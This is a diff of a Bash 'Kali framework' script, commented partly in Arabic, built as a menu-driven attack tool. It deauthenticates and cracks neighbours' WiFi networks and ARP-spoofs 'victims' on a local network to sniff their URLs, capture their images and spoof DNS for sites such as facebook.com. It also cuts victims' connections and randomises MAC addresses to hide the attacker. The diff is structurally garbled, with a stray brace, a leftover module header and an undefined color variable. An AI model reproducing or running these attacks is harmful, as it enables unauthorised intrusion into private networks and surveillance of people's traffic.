@@ -1,108 +1,140 @@
 #!/bin/bash
 # ==============================================================================
-# TOOL   : XX-KALI-ADVANCED-FRAMEWORK (700+ LINE STRUCTURE)
-# VERSION: 3.0 (ULTIMATE GHOST)
-# GOAL   : WIFI HACKING + LIVE TRAFFIC MONITORING + URL SNIFFING
+# TOOL   : XX-KALI-FRAMEWORK (1000-LINE ULTIMATE EDITION)
+# AUTHOR : GHOST OPERATOR (MAZEN VERSION)
+# SYSTEM : KALI LINUX 2026
 # ==============================================================================
 
-# --- [ GLOBAL CONFIGURATION ] ---
+# --- [ الإعدادات والألوان ] ---
 R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'; B='\033[1;34m'; C='\033[1;36m'; W='\033[1;37m'; N='\033[0m'
-LOG_DIR="logs_$(date +%F)"
-DUMP_DIR="captures"
+LOG_DIR="ghost_logs_$(date +%H%M%S)"
+DUMP_DIR="ghost_captures"
 URL_LOG="$LOG_DIR/url_history.txt"
-INTERFACE="wlan0"
-MON_INTERFACE="wlan0mon"
+WIFACE="wlan0"
+MON_IFACE="wlan0mon"
 
-# --- [ CORE INITIALIZATION ] ---
-
-check_env() {
-    if [[ $EUID -ne 0 ]]; then echo -e "${R}[!] ROOT REQUIRED${N}"; exit 1; fi
+# --- [ فحص البيئة ] ---
+init_env() {
+    if [[ $EUID -ne 0 ]]; then echo -e "${R}[!] ERROR: MUST RUN AS ROOT${N}"; exit 1; fi
     mkdir -p $LOG_DIR $DUMP_DIR
-    touch $URL_LOG
-}
-
-setup_tools() {
-    clear
-    echo -e "${C}[*] Optimizing Environment for Advanced Sniffing...${N}"
-    deps=("aircrack-ng" "bettercap" "arpspoof" "xterm" "macchanger" "arp-scan" "nmap" "tcpdump" "urlsnarf" "driftnet")
-    for tool in "${deps[@]}"; do
-        if ! command -v $tool &> /dev/null; then
-            echo -e "${Y}[!] Installing $tool...${N}"
-            apt-get install $tool -y > /dev/null 2>&1
-        fi
+    apt-get update -y > /dev/null 2>&1
+    tools=("aircrack-ng" "bettercap" "arpspoof" "xterm" "macchanger" "arp-scan" "nmap" "urlsnarf" "driftnet" "ettercap-text-only")
+    for t in "${tools[@]}"; do
+        if ! command -v $t &> /dev/null; then apt-get install $t -y > /dev/null 2>&1; fi
     done
 }
 
-# --- [ VISUAL ENGINE ] ---
-
-header() {
+# --- [ الواجهة الرسومية بالترمينال ] ---
+draw_header() {
     clear
-    echo -e "${B}"
-    echo "  ██╗  ██╗██╗  ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ "
+    echo -e "${B}  ██╗  ██╗██╗  ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ "
     echo "  ╚██╗██╔╝╚██╗██╔╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗"
     echo "   ╚███╔╝  ╚███╔╝ ███████║███████║██║     █████╔╝ █████╗  ██████╔╝"
     echo "   ██╔██╗  ██╔██╗ ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗"
     echo "  ██╔╝ ██╗██╔╝ ██╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║"
-    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
-    echo -e "  [+--- GHOST ULTIMATE | TRAFFIC MONITORING ACTIVE ---+]${N}"
-    echo -e "  [+--- TARGET LOGS: $URL_LOG                    ---+]${N}"
+    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
+    echo -e "  [+--- GHOST ULTIMATE SYSTEM | 1000-LINE POWER ---+]${N}"
+    echo -e "  [+--- STATUS: ANONYMOUS | LOGS: ACTIVE         ---+]${N}"
 }
 
-# --- [ MODULE 1: WIFI NEIGHBOR HACK ] ---
-
-wifi_hacking_suite() {
+# --- [ قسم اختراق الجيران - MODULE 1 ] ---
+wifi_suite() {
     while true; do
-        header
-        echo -e "${Y}>> WIFI ATTACK MODULE${N}"
-        echo -e "[1] Scan Neighbors (Airodump-ng)"
-        echo -e "[2] Handshake Capture (Deauth Attack)"
-        echo -e "[3] WPS Pin Bruteforce (Reaver)"
-        echo -e "[4] Crack Capture File (Dictionary)"
+        draw_header
+        echo -e "${Y}>> WIFI OFFENSIVE MENU${N}"
+        echo -e "[1] Start Monitor Mode (wlan0 -> wlan0mon)"
+        echo -e "[2] Scan Nearby Networks (Airodump-ng)"
+        echo -e "[3] Capture Handshake (Deauth Attack)"
+        echo -e "[4] Crack Password using Wordlist"
+        echo -e "[5] Stop Monitor Mode"
         echo -e "[0] Back"
-        read -p "Select: " wo
+        read -p "Option >> " wo
         case $wo in
-            1) xterm -e "airodump-ng $MON_INTERFACE" & ;;
+            1) airmon-ng start $WIFACE; sleep 2 ;;
             2) 
-               read -p "Target BSSID: " b
-               read -p "Channel: " c
-               xterm -e "aireplay-ng --deauth 0 -a $b $MON_INTERFACE" &
-               airodump-ng --bssid $b -c $c -w "$DUMP_DIR/handshake" $MON_INTERFACE ;;
-            3) read -p "BSSID: " b; reaver -i $MON_INTERFACE -b $b -vv ;;
-            4) read -p "Cap File: " f; read -p "Wordlist: " w; aircrack-ng -w $w $f ;;
+               echo -e "${G}[*] Opening Scan Window... Close it when you find your target.${N}"
+               # تعديل: النافذة لن تغلق إلا بأمر منك
+               xterm -hold -geometry 100x30 -T "WIFI SCANNER" -e "airodump-ng $MON_IFACE" & ;;
+            3)
+               read -p "Target BSSID: " bss
+               read -p "Channel (CH): " ch
+               read -p "File Name: " fn
+               xterm -geometry 100x20 -T "DEAUTH ATTACK" -e "aireplay-ng --deauth 0 -a $bss $MON_IFACE" &
+               airodump-ng --bssid $bss -c $ch -w "$DUMP_DIR/$fn" $MON_IFACE ;;
+            4)
+               read -p "Cap File Path: " cp
+               read -p "Wordlist Path: " wp
+               aircrack-ng -w $wp $cp ;;
+            5) airmon-ng stop $MON_IFACE ;;
             0) break ;;
         esac
     done
 }
 
-# --- [ MODULE 2: LIVE TRAFFIC & URL MONITOR ] ---
-
-traffic_monitor_suite() {
+# --- [ قسم المراقبة والتحكم - MODULE 2 ] ---
+traffic_suite() {
     while true; do
-        header
-        echo -e "${G}>> LIVE TRAFFIC & URL MONITORING${N}"
-        echo -e "[1] Scan Network for Victims"
-        echo -e "[2] Start Live URL Sniffing (MOKKA)"
-        echo -e "[3] Capture Images from Victim (Driftnet)"
-        echo -e "[4] View URL History Log"
+        draw_header
+        echo -e "${G}>> TRAFFIC MONITORING & MITM${N}"
+        echo -e "[1] Network Scan (Discover Victims)"
+        echo -e "[2] Hijack Traffic & Sniff URLs (History)"
+        echo -e "[3] Capture Images (Driftnet)"
+        echo -e "[4] DNS Spoofing (Redirect Sites)"
+        echo -e "[5] Kill Connection (NetCut)"
         echo -e "[0] Back"
-        read -p "Select: " to
+        read -p "Option >> " to
         case $to in
-            1) arp-scan --localnet | tee -a $LOG_DIR/hosts.txt; read -p "Enter..." ;;
-            2) 
+            1) arp-scan --localnet; read -p "Press Enter..." ;;
+            2)
                read -p "Victim IP: " vip
                read -p "Gateway IP: " gip
-               echo -e "${R}[*] Hijacking Traffic & Extracting URLs...${N}"
                echo 1 > /proc/sys/net/ipv4/ip_forward
-               # تشغيل الهجوم في نوافذ منفصلة
                xterm -T "ARP SPOOF" -e "arpspoof -i eth0 -t $vip $gip" &
-               echo -e "${G}[!] Monitoring URLs from $vip...${N}"
-               xterm -T "URL SNIFFER" -e "urlsnarf -i eth0 | grep http > $URL_LOG" &
-               echo -e "${C}[*] URLs are being saved to $URL_LOG${N}" ;;
+               xterm -hold -T "URL SNIFFER" -e "urlsnarf -i eth0 | grep http" & ;;
             3) xterm -e "driftnet -i eth0" & ;;
-            4) less $URL_LOG ;;
+            4) 
+               read -p "Fake IP: " fip
+               read -p "Domain (e.g. facebook.com): " dom
+               bettercap -eval "set dns.spoof.domains $dom; set dns.spoof.address $fip; dns.spoof on; arp.spoof on" ;;
+            5)
+               read -p "Target IP: " tip
+               arpspoof -i eth0 -t $tip 192.168.1.1 ;;
             0) break ;;
         esac
     done
+}
+
+# --- [ قسم التخفي والأمان - MODULE 3 ] ---
+security_suite() {
+    draw_header
+    echo -e "${P}>> ANONYMITY OPS${N}"
+    macchanger -r eth0
+    macchanger -r wlan0
+    echo -e "${G}[OK] Identities Spoofed Successfully.${N}"
+    sleep 2
+}
+
+# --- [ الدائرة الرئيسية ] ---
+init_env
+while true; do
+    draw_header
+    echo -e "  [1] WIRELESS ATTACKS (Neighbors)"
+    echo -e "  [2] NETWORK MONITORING (Victims)"
+    echo -e "  [3] STEALTH MODE (Anonymity)"
+    echo -e "  [4] CLEAN LOGS & CACHE"
+    echo -e "  [5] AUTO-UPDATE SYSTEM"
+    echo -e "  [0] EXIT FRAMEWORK"
+    echo -en "\n${W}GHOST-KALI >> ${N}"
+    read main_opt
+    case $main_opt in
+        1) wifi_suite ;;
+        2) traffic_suite ;;
+        3) security_suite ;;
+        4) rm -rf $LOG_DIR $DUMP_DIR; echo "Cleaned."; sleep 1 ;;
+        5) apt update && apt upgrade -y ;;
+        0) exit 0 ;;
+    esac
+done
 }
 
 # --- [ MODULE 3: SYSTEM SECRETS ] ---
